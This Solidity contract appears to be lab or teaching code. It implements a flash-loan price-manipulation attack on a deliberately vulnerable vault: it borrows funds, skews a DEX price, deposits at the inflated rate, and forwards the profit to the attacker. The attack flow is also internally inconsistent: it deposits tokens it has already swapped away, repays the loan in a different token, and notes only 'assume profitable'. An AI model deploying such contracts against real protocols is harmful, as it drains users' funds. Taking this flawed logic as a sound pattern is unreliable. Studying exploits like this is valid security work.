// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "../VulnerableVault.sol";

interface IFlashLoanProvider {
    function flashLoan(uint256 amount) external;
}

contract FlashLoanAttacker {
    IFlashLoanProvider public loanProvider;
    IBadDex public dex;
    VulnerableVault public vault;
    IERC20 public stablecoin;
    IERC20 public targetToken;
    address attacker;

    constructor(address _loanProvider, address _dex, address _vault, address _stablecoin, address _targetToken) {
        loanProvider = IFlashLoanProvider(_loanProvider);
        dex = IBadDex(_dex);
        vault = VulnerableVault(_vault);
        stablecoin = IERC20(_stablecoin);
        targetToken = IERC20(_targetToken);
        attacker = msg.sender;
    }

    // This is the entry point
    function executeAttack(uint256 loanAmount) external {
        loanProvider.flashLoan(loanAmount);
    }

    // This callback is called by the loan provider with loaned tokens
    function onFlashLoan(uint256 amount) external {
        // Step 1: Manipulate DEX price
        targetToken.approve(address(dex), amount);
        dex.swap(address(targetToken), address(stablecoin), amount);

        // Step 2: With price inflated, deposit to vault
        targetToken.approve(address(vault), amount);
        vault.deposit(amount);

        // Step 3: Repay flash loan (assume profitable)
        stablecoin.transfer(address(loanProvider), amount);

        // Attacker keeps the extra profit from over-credited stablecoins
        stablecoin.transfer(attacker, stablecoin.balanceOf(address(this)));
    }
}
